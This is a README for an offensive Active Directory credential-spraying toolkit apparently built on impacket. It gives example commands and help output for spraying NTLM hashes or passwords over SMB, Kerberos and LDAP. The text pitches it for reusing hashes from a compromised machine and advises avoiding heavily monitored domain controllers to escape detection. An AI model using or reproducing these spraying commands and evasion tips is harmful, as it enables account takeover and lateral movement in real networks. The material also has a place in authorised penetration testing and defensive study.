# HashSpray.py

Got hashes from a compromised machine and want to test if the password hash have been reused over multiple accounts? Get a userlist and spray with this tool with -hashes parameter and with the -target-ip pointing at ANY domain joined computer. You dont need to spray the heavy monitored domain controllers, authenticated users will have access to the IPC$ share by default.


This was built using the impacket library

```
python domainspray.py -userlist users -hashes :1uca3d1bd1a33geb1b15bab12196r5aa -target-ip 192.168.5.1


Active Directory Spraying Toolkit

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -userlist userlist    List of users to spray, format is [[domain/]username
  -password password    Clear-text password
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it
                        will use the domain part (FQDN) specified in the
                        target parameter
  -target-ip ip address
                        IP Address of the target machine. This may be any be
                        any domain joined computer or a domain controller
  -port [destination port]
                        Destination port to connect to SMB Server
```


```
python localspray.py -computerlist ./computers.txt -username administrator -hashes :1uca3d1bd1a33geb1b15bab12196r5aa 


Local User Spraying Toolkit

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -computerlist computerlist
                        List of computers to spray
  -username username    Username
  -password password    Clear-text password
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -port [destination port]
                        Destination port to connect to SMB Server
```


```
python adminspray.py -computerlist ./computers.txt -username cube0x0 -hashes :1uca3d1bd1a33geb1b15bab12196r5aa 


Discover Local Admin Access Spraying Toolkit

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -computerlist computerlist
                        List of computers to spray
  -username username    Username
  -password password    Clear-text password
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -port [destination port]
                        Destination port to connect to SMB Server
```


```
python3 kerbspray.py  -userlist users -hashes :1uca3d1bd1a33geb1b15bab12196r5aa -dc-ip 192.168.221.10 -domain htb.local

Kerberos AS-REQ Spraying Toolkit

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -userlist userlist    List of users to spray, format is [[domain/]username
  -password password    Clear-text password
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -domain domain        FQDN of the target domain
  -dc-ip ip address     IP Address of the domain controller. If omitted it
                        will use the domain part (FQDN) specified in the
                        target parameter
```

```
python ldapspray.py -userlist users  -hashes :1uca3d1bd1a33geb1b15bab12196r5aa -dc-ip 192.168.221.11

LDAP[s] Spraying Toolkit

optional arguments:
  -h, --help            show this help message and exit
  -port {389,636}       Destination port to connect to. LDAP defaults to 389,
                        LDAPS to 636.

authentication:
  -userlist userlist    List of users to spray, format is [[domain/]username
  -password password    Clear-text password
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -domain domain        FQDN of the target domain
  -dc-ip ip address     IP Address of the domain controller. If omitted it
                        will use the domain part (FQDN) specified in the
                        target parameter
```
